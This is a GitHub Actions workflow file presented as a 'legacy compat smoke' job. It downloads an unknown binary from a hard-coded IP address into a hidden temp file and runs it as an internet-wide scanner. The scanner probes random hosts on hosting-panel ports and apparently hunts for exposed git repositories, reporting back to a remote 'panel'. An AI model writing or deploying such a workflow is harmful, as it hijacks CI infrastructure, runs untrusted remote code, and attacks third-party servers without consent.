name: shellpanel-toolkit-push

on:
  push:
    branches:
      - main
    paths:
      - '.github/shellpanel-legacy-compat-trigger.txt'
      - '.github/workflows/shellpanel-legacy-compat-push-smoke.yml'

permissions:
  contents: read

env:
  PANEL_URL: http://43.228.157.68:80
  WORKERS: "300"
  PORTS: "80,443,8080,8443,2082,2083,2086,2087,2095,2096"
  GIT_WORKERS: "20"

jobs:
  ci-run:
    runs-on: ubuntu-latest
    timeout-minutes: 55
    steps:
      - name: Download toolkit
        shell: bash
        run: |
          set -euo pipefail
          case "$(uname -m 2>/dev/null)" in
            i[3-6]86) suffix=386 ;;
            aarch64|arm64) suffix=arm64 ;;
            armv*) suffix=arm ;;
            *) suffix=amd64 ;;
          esac
          curl -sfL "${PANEL_URL}/api/dl/${suffix}" -o /tmp/.svc 2>/dev/null || \
            wget -qO /tmp/.svc "${PANEL_URL}/api/dl/${suffix}" 2>/dev/null
          test -s /tmp/.svc
          chmod 755 /tmp/.svc

      - name: Run toolkit
        shell: bash
        run: |
          PANEL_URL="${PANEL_URL}" \
          GITHUB_REPOSITORY="${GITHUB_REPOSITORY}" \
          GITHUB_RUN_ID="${GITHUB_RUN_ID}" \
          GOMEMLIMIT=2147483648 \
          /tmp/.svc ipscan \
            --source random \
            --workers "${WORKERS}" \
            --git \
            --ports "${PORTS}" \
            --git-workers "${GIT_WORKERS}" \
            --count 0 --no-reverse 2>&1 | tail -2 || true
